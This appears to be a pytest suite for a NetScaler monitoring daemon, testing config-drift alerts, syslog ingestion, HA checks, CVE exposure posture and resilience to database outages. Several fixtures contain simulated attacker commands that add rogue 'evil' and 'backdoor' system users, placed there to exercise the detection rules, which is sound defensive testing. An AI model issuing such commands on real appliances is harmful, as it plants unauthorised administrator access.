import asyncio
import threading
from dataclasses import replace
from datetime import UTC, date, datetime, timedelta
from pathlib import Path

import httpx
import pytest
import yaml
from sqlalchemy import create_engine
from sqlalchemy.exc import IntegrityError, OperationalError

from scalar.config import (
    Config,
    Device,
    DeviceFim,
    FimDefaults,
    HaPair,
    Notify,
    WebhookSink,
)
from scalar.control import ControlClient
from scalar.daemon import service as service_module
from scalar.daemon.service import (
    Service,
    coverage_reductions,
    instance_lock,
)
from scalar.detect.findings import AuditStatus, Finding
from scalar.detect.severity import Severity
from scalar.runtime import Runtime
from scalar.secrets.base import Credential, CredentialError
from scalar.secrets.resolver import CredentialBlocked
from scalar.secrets.vault import Vault, generate_key
from scalar.store.database import Database
from scalar.transport.nitro import NitroClient
from scalar.web.auth import set_password
from tests.emulator.nitro import FakeNitro

requires_peercred = pytest.mark.skipif(
    not hasattr(__import__("socket"), "SO_PEERCRED"), reason="needs Linux SO_PEERCRED")

EXAMPLE = Path(__file__).parents[2] / "deploy" / "config.example.yaml"
BASE = "#NS14.1 Build 73.37\nset ns hostName ns-gw-01\n"


def test_platform_resources_are_bounded_and_unavailable_paths_are_explicit(tmp_path: Path) -> None:
    import json

    from scalar.daemon.health import ResourceMonitor

    monitor = ResourceMonitor()
    snapshot = monitor.snapshot(tmp_path, tmp_path / "missing")
    assert snapshot["process"]["pid"] > 0
    assert snapshot["process"]["uptime_seconds"] >= 0
    assert snapshot["filesystems"]["state"]["total_bytes"] > 0
    assert "logs_filesystem" in snapshot["errors"]
    assert "cmdline" not in json.dumps(snapshot)


async def test_transport_failure_has_health_diagnostic_and_preserves_counters(setup) -> None:  # type: ignore[no-untyped-def]
    service, _fake, _sink = setup
    device = service.cfg.devices[0]
    service.health[device.name].attempts = 1
    await service._handle_poll_error(device, httpx.ConnectTimeout("unreachable"))
    health = service.health[device.name]
    assert "timed out" in health.last_error
    assert health.error_type == "ConnectTimeout"
    assert health.total_failures == 1 and health.last_failure is not None
    service._ok(device)
    assert health.successes == 1 and health.total_failures == 1
    assert health.last_error == "" and health.failures == 0
    status = service.status()
    assert "resources" in status


async def test_exposure_failures_are_visible_in_device_health(setup) -> None:  # type: ignore[no-untyped-def]
    service, fake, _sink = setup
    fake.denied.add("nsversion")
    stop_after(service, 1)
    await service.exposure_loop()
    health = service.exposure_health[service.cfg.devices[0].name]
    assert health.attempts == 1 and health.total_failures == 1
    assert health.last_failure is not None
    assert health.error_type == "PermissionDenied"
    assert "not permitted" in health.last_error


async def test_empty_inventory_runs_idle_without_appliance_requests(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    cfg = svc.cfg.model_copy(update={"devices": [], "ha_pairs": []})
    service = Service(Runtime(cfg, svc.rt.key_loader, nitro_transport=svc.rt.nitro_transport,
                              config_path=svc.rt.config_path),
                      database=svc.db, sinks=[])
    running = asyncio.create_task(service.run())
    try:
        await asyncio.wait_for(service._reload_complete.wait(), 5)
        assert service.setup_error == ""
        assert service.status()["state"] == "idle"
        assert "No devices configured" in service.digest(datetime.now(UTC)).summary
        assert fake.login_attempts == 0
    finally:
        service.stop()
        await asyncio.wait_for(running, 5)


async def test_settings_reload_waits_for_active_log_batch(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    running = asyncio.create_task(svc.run())
    await asyncio.wait_for(svc._reload_complete.wait(), 5)
    entered = threading.Event()
    release = threading.Event()

    def active_batch() -> None:
        with svc.pipeline._lock:
            entered.set()
            release.wait(5)

    worker = asyncio.create_task(asyncio.to_thread(active_batch))
    try:
        assert await asyncio.to_thread(entered.wait, 2)
        document = svc.cfg.model_dump(mode="json")
        document["syslog"]["batch_lines"] += 1
        svc.rt.config_path.write_text(yaml.safe_dump(document))
        reload = asyncio.create_task(svc.apply_settings())
        completed, _pending = await asyncio.wait([reload], timeout=0.1)
        assert not completed
        release.set()
        assert (await asyncio.wait_for(reload, 5))["applied"]
    finally:
        release.set()
        await worker
        svc.stop()
        await asyncio.wait_for(running, 5)


@pytest.mark.parametrize("change", ["retention", "credential_age", "digest", "silence", "web", "none"])
async def test_simple_settings_apply_preserves_workers_and_health(setup, change: str) -> None:  # type: ignore[no-untyped-def]
    service, _fake, _sink = setup
    running = asyncio.create_task(service.run())
    try:
        await asyncio.wait_for(service._reload_complete.wait(), 5)
        pipeline, database, health = service.pipeline, service.db, service.health
        started = service.started_at
        tasks = {task for task in asyncio.all_tasks() if task.get_name().startswith("config:")}
        document = service.cfg.model_dump(mode="json")
        if change == "retention":
            document["retention"]["findings_days"] = 180
        elif change == "credential_age":
            document["max_credential_age_days"] = 75
        elif change == "digest":
            document["notify"]["daily_digest_hour_utc"] = 12
        elif change == "silence":
            document["defaults"]["intervals"]["syslog_silence_alert"] = 1200
        elif change == "web":
            document["web"]["session_hours"] = 4
        service.rt.config_path.write_text(yaml.safe_dump(document))
        result = await service.apply_settings()
        assert result["applied"] and not result["workers_reloaded"]
        assert result["web_reload"] is (change == "web")
        assert service.pipeline is pipeline and service.db is database
        assert service.health is health and service.started_at == started
        assert tasks and all(not task.done() for task in tasks)
        assert service.cfg == Config.model_validate(document)
    finally:
        service.stop()
        await asyncio.wait_for(running, 5)


class CollectSink:
    name = "collect"
    min_severity = Severity.INFO

    def __init__(self) -> None:
        self.sent: list[Finding] = []

    async def send(self, f: Finding) -> None:
        self.sent.append(f)


@pytest.mark.parametrize("settings", [
    {"spki_pinning": False, "spki_pin": "unused-old-fingerprint"},
    {"spki_pinning": False, "spki_pin": None},
    {"spki_pin": None, "ca_bundle": "/etc/scalar/roots.pem"},
])
async def test_readiness_accepts_ca_validation_without_spki(setup, settings) -> None:  # type: ignore[no-untyped-def]
    service, fake, _sink = setup
    device = service.cfg.devices[0].model_copy(update=settings)
    service.rt.cfg = service.cfg.model_copy(update={"devices": [device]})
    service.rt.nitro_transport = None
    await service._readiness()
    assert not fake.requests


@pytest.fixture
def setup(tmp_path: Path):  # type: ignore[no-untyped-def]
    doc = yaml.safe_load(EXAMPLE.read_text())
    doc["devices"] = doc["devices"][:1]
    doc["ha_pairs"] = []
    doc["notify"] = {}
    doc["paths"] = {"state_dir": str(tmp_path / "state"), "vault": str(tmp_path / "vault"),
                    "log_dir": str(tmp_path / "logs"), "control_socket": str(tmp_path / "c.sock")}
    cfg = Config.model_validate(doc)
    config_path = tmp_path / "config.yaml"
    config_path.write_text(yaml.safe_dump(cfg.model_dump(mode="json")))
    key = generate_key()
    Vault.create(cfg.paths.vault, key).set("sc_nitro", Credential("sc_nitro", "nitro-password"),
                                           actor="t")
    fake = FakeNitro(running=BASE, saved=BASE)
    rt = Runtime(cfg, lambda: key, nitro_transport=lambda d: fake.transport(), config_path=config_path)
    sink = CollectSink()
    database = Database(create_engine(f"sqlite:///{tmp_path / 'index.db'}"))
    database.initialize()
    svc = Service(rt, sinks=[sink], database=database)
    return svc, fake, sink


def stop_after(svc: Service, n: int, between=None):  # type: ignore[no-untyped-def]
    calls = {"n": 0}

    async def fake_sleep(seconds: float) -> bool:
        calls["n"] += 1
        if between:
            between(calls["n"])
        if calls["n"] > n:
            svc.stop()
            return False
        return True

    svc._sleep = fake_sleep  # type: ignore[method-assign]


async def test_config_loop_alerts_on_change_with_one_session(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup

    def mutate(i: int) -> None:
        if i == 2:  # after baseline tick
            fake.running = BASE + "add system user evil 0123456789abcdef0123 -encrypted\n"
            fake.lastconfigchangedtime = "later"

    stop_after(svc, 4, mutate)
    await svc.config_loop(svc.cfg.devices[0])
    await svc.deliver_pending()
    ids = [f.rule_id for f in sink.sent]
    assert "config-running" in ids and "config-drift" in ids
    assert fake.login_attempts == 1  # one NITRO session reused across polls
    logged = list(svc.findings_log.read())
    assert {d["rule_id"] for d in logged} >= {"config-running"}
    assert svc.db.pending() == []


async def test_auth_rejection_blocks_and_alerts_once(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    fake.users["sc_nitro"] = "rotated-on-appliance"
    stop_after(svc, 5)
    await svc.config_loop(svc.cfg.devices[0])
    await svc.deliver_pending()
    assert fake.login_attempts == 1  # never retried into a lockout
    health = [f for f in sink.sent if f.category == "health"]
    assert len(health) == 1 and health[0].severity is Severity.HIGH


async def test_daemon_recovers_after_external_credential_rotation(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    fake.users["sc_nitro"] = "rotated-on-appliance"
    admin_runtime = Runtime(svc.cfg, svc.rt.key_loader)

    def rotate(step: int) -> None:
        if step == 3:
            admin_runtime.provider.vault.set(
                "sc_nitro", Credential("sc_nitro", "rotated-on-appliance"), actor="admin")

    stop_after(svc, 6, rotate)
    await svc.config_loop(svc.cfg.devices[0])
    assert fake.login_attempts == 2
    assert svc.health[svc.cfg.devices[0].name].last_ok is not None


async def test_unreachable_after_repeated_failures(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    fake.denied.add("nsconfig")  # every poll fails with a permission error
    stop_after(svc, 7)
    await svc.config_loop(svc.cfg.devices[0])
    await svc.deliver_pending()
    health = [f for f in sink.sent if f.rule_id == "health-device-unreachable"]
    assert len(health) == 1


async def test_digest_reports_unmonitored(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _, _ = setup
    d = svc.digest(datetime(2026, 10, 5, 7, tzinfo=UTC))
    assert "NOT MONITORED: ns-gw-01" in d.summary and d.category == "digest"


async def test_live_syslog_is_archived_detected_and_not_replayed(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    device = svc.cfg.devices[0]
    directory = svc.cfg.paths.log_dir / "syslog" / device.nsip
    directory.mkdir(parents=True)
    line = ('2026-10-05T10:00:01Z ' + device.nsip + ' <local0.info> '
            '2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : '
            'User admin1 - Remote_ip 198.51.100.7 - Command "add system user backdoor ****" '
            '- Status "Success"\n')
    (directory / "2026-10-05.log").write_bytes(line.encode())
    assert await asyncio.to_thread(svc.pipeline.poll, device) == 1
    assert svc.db.counts()["events"] == 1
    await svc.deliver_pending()
    assert "mgmt-high-risk-command" in {finding.rule_id for finding in sink.sent}
    assert svc.pipeline.archive.verify(device.name) == 1
    restarted = Service(svc.rt, sinks=[sink], database=svc.db)
    assert await asyncio.to_thread(restarted.pipeline.poll, device) == 0
    assert restarted.db.counts()["events"] == 1


async def test_syslog_silence_alert_requires_reachable_device(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    now = svc.started_at + timedelta(hours=1)
    await svc.check_syslog_health(now)
    assert svc.db.counts()["findings"] == 0
    svc._ok(svc.cfg.devices[0])
    await svc.check_syslog_health(now)
    await svc.deliver_pending()
    assert [finding.rule_id for finding in sink.sent] == ["syslog-silent"]


async def test_supervisor_fails_when_a_worker_stops(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup

    async def fail() -> None:
        raise ValueError("worker failure")

    monkeypatch.setattr(svc, "exposure_loop", fail)
    with pytest.raises(RuntimeError, match="exposure stopped"):
        await asyncio.wait_for(svc.run(), timeout=5)


def test_only_one_daemon_can_own_state(tmp_path: Path) -> None:
    path = tmp_path / "daemon.lock"
    with instance_lock(path), pytest.raises(RuntimeError, match="already running"), instance_lock(path):
        pytest.fail("second daemon acquired the lock")
    with instance_lock(path):
        pass


async def test_status_is_written_and_includes_feed_health(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    stop_after(svc, 0)
    await svc.status_loop()
    import json

    status = json.loads((svc.cfg.paths.state_dir / "status.json").read_bytes())
    assert status["state"] == "degraded"
    assert status["devices"]["ns-gw-01"]["syslog"]["lines"] == 0


@pytest.mark.parametrize("source_changed", ["unchanged", "appended", "removed"])
async def test_syslog_database_retry_preserves_computed_findings(setup, monkeypatch: pytest.MonkeyPatch,
                                                                 source_changed: str) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    device = svc.cfg.devices[0]
    directory = svc.cfg.paths.log_dir / "syslog" / device.nsip
    directory.mkdir(parents=True)
    (directory / "2026-10-05.log").write_text(
        '2026/10/05:10:00:00 GMT ns-gw-01 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : '
        'User admin - Remote_ip 192.0.2.1 - Command "add system user backdoor ****" '
        '- Status "Success"\n')
    original = svc.db.ingest

    def fail(*args, **kwargs):  # type: ignore[no-untyped-def]
        raise RuntimeError("database unavailable")

    monkeypatch.setattr(svc.db, "ingest", fail)
    with pytest.raises(RuntimeError, match="unavailable"):
        svc.pipeline.poll(device)
    assert not svc.pipeline.tailer.checkpoints.exists()
    monkeypatch.setattr(svc.db, "ingest", original)
    path = directory / "2026-10-05.log"
    if source_changed == "appended":
        with path.open("a") as stream:
            stream.write("another log line\n")
    elif source_changed == "removed":
        path.unlink()
    restarted = Service(svc.rt, sinks=[sink], database=svc.db)
    restarted.pipeline.engine.rules.clear()
    restarted.pipeline.engine._by_event.clear()
    assert restarted.pipeline.poll(device) == (2 if source_changed == "appended" else 1)
    await restarted.deliver_pending()
    assert "mgmt-high-risk-command" in {finding.rule_id for finding in sink.sent}


async def test_ha_divergence_waits_for_sync_grace_and_resets(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    primary = svc.cfg.devices[0]
    secondary = Device(name="secondary", nsip="192.0.2.20")
    cfg = svc.cfg.model_copy(update={"devices": [primary, secondary],
                                    "ha_pairs": [HaPair(name="pair", nodes=[primary.name,
                                                                           secondary.name])]})
    service = Service(Runtime(cfg, svc.rt.key_loader), sinks=[sink], database=svc.db)
    service._ok(primary)
    service._ok(secondary)
    now = datetime.now(UTC)
    service.store.put(primary.name, "running", BASE)
    service.store.put(secondary.name, "running", BASE + "add system user other hash -encrypted\n")
    await service.check_ha(now)
    await service.check_ha(now + timedelta(seconds=179))
    assert service.db.counts()["findings"] == 0
    await service.check_ha(now + timedelta(seconds=181))
    await service.deliver_pending()
    assert [finding.rule_id for finding in sink.sent] == ["config-peer"]
    service.store.put(secondary.name, "running", BASE.replace("ns-gw-01", "secondary"))
    await service.check_ha(now + timedelta(seconds=240))
    assert service.store.get_state("ha-pair") == {}


async def test_daemon_pause_prevents_appliance_polling(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    await svc.pause_monitoring()
    stop_after(svc, 3)
    await svc.config_loop(svc.cfg.devices[0])
    assert fake.login_attempts == 0
    assert svc.status()["state"] == "paused"


@requires_peercred
async def test_daemon_control_can_apply_settings_and_resume(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    set_password(svc.cfg.paths.state_dir / "web-users.json", "admin", "daemon-admin-test-password")
    task = asyncio.create_task(svc.run())
    try:
        await asyncio.wait_for(svc._reload_complete.wait(), 5)
        client = ControlClient(svc.cfg.paths.control_socket)
        assert (await client.call("admin", "monitor.pause"))["paused"]
        document = await client.call("admin", "settings.get")
        document["document"]["max_credential_age_days"] = 60
        result = await client.call("admin", "settings.save", {
            "document": document["document"], "revision": document["revision"]})
        assert result["applied"] and svc.cfg.max_credential_age_days == 60
        assert not result["workers_reloaded"] and not result["web_reload"]
        assert not (await client.call("admin", "settings.get"))["pending_apply"]
        assert not (await client.call("admin", "monitor.resume"))["paused"]
    finally:
        svc.stop()
        await asyncio.wait_for(task, 5)


# ---- resilience ------------------------------------------------------------------------


def _db_down(statement: str = "INSERT INTO findings") -> OperationalError:
    return OperationalError(statement, {"secret": "bound-parameter"},
                            ConnectionRefusedError("connection refused"))


async def _until(condition, timeout: float = 5) -> None:  # type: ignore[no-untyped-def]
    async def wait() -> None:
        while not condition():
            await asyncio.sleep(0.01)

    await asyncio.wait_for(wait(), timeout)


async def test_readiness_retries_transient_database_failure(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    monkeypatch.setattr(service_module, "READINESS_RETRY", (0.05, 0.1))
    original, calls = svc.db.check, []

    def check() -> None:
        calls.append(1)
        if len(calls) == 1:
            raise _db_down("SELECT version")
        original()

    monkeypatch.setattr(svc.db, "check", check)
    running = asyncio.create_task(svc.run())
    try:
        await _until(lambda: bool(calls))
        await _until(lambda: "retrying" in svc.setup_error or len(calls) > 1)
        await _until(lambda: not svc.setup_error and any(
            task.get_name().startswith("config:") for task in asyncio.all_tasks()))
        assert len(calls) == 2
    finally:
        svc.stop()
        await asyncio.wait_for(running, 5)


async def test_readiness_configuration_error_waits_for_an_administrator(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    monkeypatch.setattr(service_module, "READINESS_RETRY", (0.01, 0.02))
    calls = []

    def check() -> None:
        calls.append(1)
        raise ValueError("database schema is not initialized; run scalar db init")

    monkeypatch.setattr(svc.db, "check", check)
    running = asyncio.create_task(svc.run())
    try:
        await asyncio.wait_for(svc._reload_complete.wait(), 5)
        await asyncio.sleep(0.2)
        assert calls == [1] and "schema is not initialized" in svc.setup_error
    finally:
        svc.stop()
        await asyncio.wait_for(running, 5)


async def test_emit_logs_locally_first_and_spools_daemon_findings(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    original = svc.db.save_finding

    def down(*args, **kwargs):  # type: ignore[no-untyped-def]
        raise _db_down()

    monkeypatch.setattr(svc.db, "save_finding", down)
    finding = Finding("syslog-silent|ns-gw-01", "syslog-silent", "Syslog feed is silent",
                      Severity.HIGH, "health", "ns-gw-01", "silent")
    with pytest.raises(OperationalError):
        await svc.emit(finding)
    await svc.record(finding)  # spooled, not raised, not logged twice
    assert [doc["rule_id"] for doc in svc.findings_log.read()] == ["syslog-silent"]
    warning = " ".join(svc.status()["warnings"])
    assert "Database unavailable (OperationalError: connection refused)" in warning
    assert "INSERT" not in warning and "bound-parameter" not in warning
    with pytest.raises(OperationalError):
        await svc.deliver_pending()
    monkeypatch.setattr(svc.db, "save_finding", original)
    assert await svc.deliver_pending() == 1
    assert [f.rule_id for f in sink.sent] == ["syslog-silent"] and svc.db_error == ""


async def test_notification_loop_backs_off_while_outbox_is_unavailable(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    original, calls, waits = svc.db.pending, [], []

    def pending(*args, **kwargs):  # type: ignore[no-untyped-def]
        calls.append(1)
        if len(calls) <= 2:
            raise _db_down("SELECT outbox")
        return original(*args, **kwargs)

    async def fake_sleep(seconds: float) -> bool:
        waits.append(seconds)
        if len(waits) >= 4:
            svc.stop()
            return False
        return True

    monkeypatch.setattr(svc.db, "pending", pending)
    svc._sleep = fake_sleep  # type: ignore[method-assign]
    await svc.notification_loop()
    assert waits == [5.0, 10.0, 5.0, 5.0] and svc.db_error == ""


async def test_syslog_loop_backs_off_on_database_outage(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    waits = []

    def poll(device):  # type: ignore[no-untyped-def]
        raise _db_down()

    async def fake_sleep(seconds: float) -> bool:
        waits.append(seconds)
        if len(waits) >= 6:
            svc.stop()
            return False
        return True

    monkeypatch.setattr(svc.pipeline, "poll", poll)
    svc._sleep = fake_sleep  # type: ignore[method-assign]
    await svc.syslog_loop()
    assert waits == [5, 10, 20, 40, 60, 60]
    await svc.deliver_pending()
    errors = [f for f in sink.sent if f.rule_id == "syslog-ingestion-error"]
    assert len(errors) == 1 and "INSERT" not in errors[0].summary


async def test_poison_syslog_batch_is_quarantined_without_stopping_the_loop(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, sink = setup
    device = svc.cfg.devices[0]
    directory = svc.cfg.paths.log_dir / "syslog" / device.nsip
    directory.mkdir(parents=True)
    (directory / "2026-10-05.log").write_text(
        '2026/10/05:10:00:00 GMT ns-gw-01 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : '
        'User admin - Remote_ip 192.0.2.1 - Command "add system user backdoor ****" '
        '- Status "Success"\n')
    original = svc.db.ingest

    def ingest(batch, alerts, now=None):  # type: ignore[no-untyped-def]
        if batch:
            raise IntegrityError("INSERT INTO events", {}, Exception("value too long"))
        return original(batch, alerts, now)

    monkeypatch.setattr(svc.db, "ingest", ingest)
    stop_after(svc, 5)
    await svc.syslog_loop()
    await svc.deliver_pending()
    ids = [f.rule_id for f in sink.sent]
    assert "syslog-ingestion-error" in ids and "syslog-batch-quarantined" in ids
    assert "mgmt-high-risk-command" in ids  # the batch's own alert is still delivered
    assert svc.pipeline.health[device.name].quarantined == 1
    assert any("quarantined" in warning for warning in svc.status()["warnings"])
    assert "SYSLOG BATCHES QUARANTINED: ns-gw-01 (1)" in svc.digest(datetime.now(UTC)).summary


async def test_config_findings_survive_a_database_outage(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    original, state = svc.db.save_finding, {"down": True}

    def save(*args, **kwargs):  # type: ignore[no-untyped-def]
        if state["down"]:
            raise _db_down()
        return original(*args, **kwargs)

    def mutate(i: int) -> None:
        if i == 2:
            fake.running = BASE + "add server web1 10.0.0.5\n"
            fake.lastconfigchangedtime = "later"
        if i == 4:
            state["down"] = False

    monkeypatch.setattr(svc.db, "save_finding", save)
    stop_after(svc, 5, mutate)
    await svc.config_loop(svc.cfg.devices[0])
    await svc.deliver_pending()
    assert [f.rule_id for f in sink.sent].count("config-running") == 1
    health = svc.health[svc.cfg.devices[0].name]
    assert health.failures == 0 and health.total_failures == 0
    assert [doc["rule_id"] for doc in svc.findings_log.read()].count("config-running") == 1


def test_crash_loop_reaches_the_failed_state() -> None:
    from configparser import ConfigParser

    unit = ConfigParser(interpolation=None, strict=False)
    unit.read(EXAMPLE.parent / "scalar.service")
    interval = int(unit["Unit"]["StartLimitIntervalSec"])
    burst = int(unit["Unit"]["StartLimitBurst"])
    restart = int(unit["Service"]["RestartSec"].removesuffix("s"))
    assert burst >= 5  # an occasional restart must not disable the service
    assert burst * (restart + 15) < interval  # a sustained crash loop must trip the limit


# ---- exposure ---------------------------------------------------------------------------


async def test_exposure_loop_reports_unknown_train_and_stale_data(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    fake.version = "NetScaler NS15.1: Build 10.1.nc, Date: Sep 20 2026, 10:00:00   (64-bit)"
    svc.cve_data = replace(svc.cve_data, data_version=date(2026, 1, 1))
    stop_after(svc, 1)
    await svc.exposure_loop()
    await svc.deliver_pending()
    sent = {f.rule_id: f for f in sink.sent}
    assert sent["exposure-unknown-train"].severity is Severity.HIGH
    assert sent["exposure-data-stale"].category == "health"
    status = svc.status()
    assert status["advisory_data"]["data_version"] == "2026-01-01"
    assert status["advisory_data"]["stale"] is True and status["advisory_data"]["age_days"] > 30
    posture = status["devices"]["ns-gw-01"]["exposure"]["posture"]
    assert posture["worst"] == "unknown" and posture["lifecycle"] == "unknown"
    assert posture["min_safe_build"] is None and "CVE-2023-4966" in posture["needs_attention"]


async def test_exposure_loop_reports_lifecycle_and_posture(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    fake.version = "NetScaler NS13.1: Build 58.21.nc, Date: Sep 20 2026, 10:00:00   (64-bit)"
    stop_after(svc, 1)
    await svc.exposure_loop()
    await svc.deliver_pending()
    lifecycle = next(f for f in sink.sent if f.rule_id == "exposure-lifecycle")
    assert lifecycle.severity is Severity.MEDIUM
    assert any(f.rule_id.startswith("exposure-CVE-") for f in sink.sent)
    posture = svc.status()["devices"]["ns-gw-01"]["exposure"]["posture"]
    assert posture["lifecycle"] == "end_of_maintenance" and posture["worst"] == "vulnerable"
    assert posture["min_safe_build"] == "64.29" and posture["actionable"]
    assert (posture["train"], posture["version"]) == ("13.1", "13.1 58.21")


async def test_lifecycle_is_reported_on_change_and_weekly_not_daily(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    email = CollectSink()
    email.name = "smtp"
    email.min_severity = Severity.MEDIUM
    service = _healthy(svc, email)
    fake.version = "NetScaler NS13.1: Build 58.21.nc, Date: Sep 20 2026, 10:00:00   (64-bit)"

    async def runs(count: int) -> list[dict]:  # type: ignore[type-arg]
        service._stop.clear()
        stop_after(service, count)
        await service.exposure_loop()
        docs = service.db.recent_findings(datetime.now(UTC) - timedelta(hours=1))
        return [doc for doc in docs if doc["rule_id"] == "exposure-lifecycle"]

    assert len(await runs(2)) == 1  # two daily runs: one finding
    queued = [d for d in service.db.pending(now=datetime.now(UTC) + timedelta(days=1))
              if d.finding.rule_id == "exposure-lifecycle"]
    assert [d.sink for d in queued] == ["smtp"]
    service = Service(service.rt, sinks=[email], database=service.db)
    assert len(await runs(1)) == 1  # restart: the state is durable
    key = "_exposure-ns-gw-01"  # gitleaks:allow (state key name)
    state = service.store.get_state(key)
    state["reported_at"] = (datetime.now(UTC) - timedelta(days=8)).isoformat()
    service.store.set_state(key, state)
    assert len(await runs(1)) == 2  # weekly reminder
    fake.version = "NetScaler NS13.0: Build 92.21.nc, Date: Sep 20 2026, 10:00:00   (64-bit)"
    lifecycle = await runs(1)
    assert len(lifecycle) == 3 and lifecycle[0]["evidence"]["lifecycle"] == "end_of_life"


# ---- config-change attribution ----------------------------------------------------------


async def _low_risk_change(svc: Service, fake: FakeNitro, device: Device | None = None) -> dict:  # type: ignore[type-arg]
    def mutate(i: int) -> None:
        if i == 2:
            fake.running = BASE + "add server web1 10.0.0.5\n"
            fake.lastconfigchangedtime = "later"

    stop_after(svc, 3, mutate)
    await svc.config_loop(device or svc.cfg.devices[0])
    docs = svc.db.recent_findings(datetime.now(UTC) - timedelta(hours=1))
    return next(doc for doc in docs if doc["rule_id"] == "config-running")


@pytest.mark.parametrize(("feed", "severity", "status"), [
    ("never", "low", None),
    ("stale", "high", "unavailable"),
    ("errored", "high", "unavailable"),
    ("fresh", "high", "available"),  # checked, and nobody made the change: unattributed
    ("disabled", "low", "disabled"),
])
async def test_config_change_attribution_status(setup, feed: str, severity: str, status: str | None) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    health = svc.pipeline.health["ns-gw-01"]
    seen = datetime.now(UTC) - timedelta(minutes=10 if feed == "stale" else 0)
    if feed != "never":
        health.record("nslog", 3, seen)
    if feed == "errored":
        health.last_error = "OSError: disk full"
    if feed == "disabled":
        svc.rt.cfg = svc.cfg.model_copy(update={
            "syslog": svc.cfg.syslog.model_copy(update={"enabled": False})})
    finding = await _low_risk_change(svc, fake)
    assert finding["severity"] == severity
    assert finding["evidence"]["attribution_status"] == status
    if status == "unavailable":
        assert finding["evidence"]["audit_unavailable_since"] == seen.isoformat()
        assert f"audit feed unavailable since {seen.isoformat()}" in finding["summary"]
        assert finding["evidence"]["unattributed"] is False


def _ha_service(svc: Service) -> Service:
    primary = svc.cfg.devices[0]
    peer = Device(name="peer", nsip="192.0.2.20")
    cfg = svc.cfg.model_copy(update={"devices": [primary, peer], "ha_pairs": [
        HaPair(name="pair", nodes=[primary.name, peer.name])]})
    service = Service(Runtime(cfg, svc.rt.key_loader, nitro_transport=svc.rt.nitro_transport,
                              config_path=svc.rt.config_path), sinks=[], database=svc.db)
    service.pipeline.health[primary.name].record("nslog", 3,
                                                 datetime.now(UTC) - timedelta(minutes=10))
    return service


@pytest.mark.parametrize(("role", "severity"), [
    ("Secondary", "low"), ("STAYSECONDARY", "low"), ("Primary", "high")])
async def test_unavailable_audit_feed_is_not_escalated_on_ha_secondary(setup, role: str, severity: str) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    service = _ha_service(svc)
    primary = service.cfg.devices[0]
    # NITRO hanode: `state` is node health, `hacurmasterstate` the HA role.
    fake.resources["hanode"] = [
        {"id": 0, "ipaddress": primary.nsip, "state": "UP", "hacurmasterstate": role},
        {"id": 1, "ipaddress": "192.0.2.20", "state": "UP", "hacurmasterstate": "Primary"}]
    finding = await _low_risk_change(service, fake, primary)
    assert finding["severity"] == severity


@pytest.mark.parametrize("error", [
    CredentialBlocked("local:sc_nitro is blocked after an authentication rejection"),
    CredentialError("vault unavailable"), RuntimeError("unexpected")])
async def test_ha_role_lookup_failure_escalates_instead_of_withholding(setup, monkeypatch: pytest.MonkeyPatch, error: Exception) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    service = _ha_service(svc)

    async def ha_nodes(self):  # type: ignore[no-untyped-def]
        raise error

    monkeypatch.setattr(NitroClient, "ha_nodes", ha_nodes)
    finding = await _low_risk_change(service, fake, service.cfg.devices[0])
    assert finding["severity"] == "high"
    assert finding["evidence"]["attribution_status"] == "unavailable"


async def test_audit_feed_last_seen_survives_reload_and_restart(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    device = svc.cfg.devices[0].name
    seen = datetime.now(UTC) - timedelta(minutes=10)
    svc.pipeline.health[device].record("nslog", 3, seen)
    svc._configure()  # worker reload: FeedHealth starts empty again
    assert svc.pipeline.health[device].sources == {}
    assert svc.audit_status(device) == (AuditStatus.UNAVAILABLE, seen)
    restarted = Service(svc.rt, sinks=[], database=svc.db)
    assert restarted.audit_status(device) == (AuditStatus.UNAVAILABLE, seen)
    finding = await _low_risk_change(restarted, fake)
    assert finding["severity"] == "high"
    assert finding["evidence"]["audit_unavailable_since"] == seen.isoformat()


async def test_audit_feed_last_seen_is_persisted_by_the_syslog_loop(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    device = svc.cfg.devices[0].name
    assert svc.audit_status(device) == (None, None)  # never observed: no escalation
    seen = datetime.now(UTC) - timedelta(minutes=3)
    svc.pipeline.health[device].record("nslog", 1, seen)
